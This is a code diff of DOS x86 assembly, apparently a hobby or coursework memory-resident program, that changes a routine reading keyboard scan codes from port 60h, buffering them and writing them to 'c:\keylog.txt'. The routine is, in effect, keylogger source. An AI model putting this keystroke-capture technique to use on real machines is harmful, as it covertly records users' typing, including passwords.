@@ -99,30 +99,16 @@ old_9h_s dw 0h
 
 read_to_buff proc 
 	
-	mov ah, 02h
-	mov dl, 92d
-	int 21h
-
 	;saving pressed key
 		in al, 60h;	
 	
-	;setting bl as tail
+	;setting bx as len 
+		mov bl, len
 		xor bh, bh
-		mov bl, buff_tail
-	
-	;writing pressed key to the buffer
-		mov di, offset buff
-		add di, bx 
 
-		mov cs:[di], al
-	
-	;adjusting tail
-		inc bl
-		mov byte ptr buff_tail, bl 
-
-	;skipping key release
-		in al, 60h;
-		xor al, al	
+	;saving key to buff
+		mov buff[bx], al
+		inc len 
 
 		ret
 		endp
@@ -130,12 +116,11 @@ read_to_buff proc
 
 flush_buff proc 
 
-;		mov ah, 02h
-;		mov dl, 70d
-;		int 21h
-	
+		push cs
+		pop ds
+
 	;opening file by adress in ds:dx and saving its handler  
-		mov ax, 3d02h; 
+		mov ax, 3d01h; 
 		mov dx, offset log_file;
 		int 21h
 		mov file_handler, ax
@@ -148,37 +133,15 @@ flush_buff proc
 		xor dx, dx
 		int 21h
 
-
-	;setting dl as head
-		mov dl, buff 	
-		add dl, buff_head
-	
-	;setting bl as tail
-		mov bl, buff 	
-		add bl, buff_tail
-
-
-	;counting num of symbols to write
-		push dx
-		sub dl, bl
-		mov cl, dl
-		pop dx
-
-	;writing symbols to file
-		push bx
-		push dx
+	;writing to file
 		mov ah, 40h
 		mov bx, file_handler
+		mov cl, len
 		xor ch, ch
-		xor dh, dh
+		mov dx, offset buff
 		int 21h
-		pop dx
-		pop bx
-
-	;moving head
-		mov dl, bl
-		mov cs:[buff_head], dl
-
+		
+		mov len, 0d
 
 	;closing file
 		mov ah, 3eh
@@ -189,13 +152,13 @@ flush_buff proc
 		ret
 		endp
 
+
 log_file db 'c:\keylog.txt', 0
 file_handler dw ?
 
+len db 0d
 
-buff db 256 dup (?)
-buff_head db 0 
-buff_tail db 0
+buff db 257d dup (0h)
 
 
 end_label:
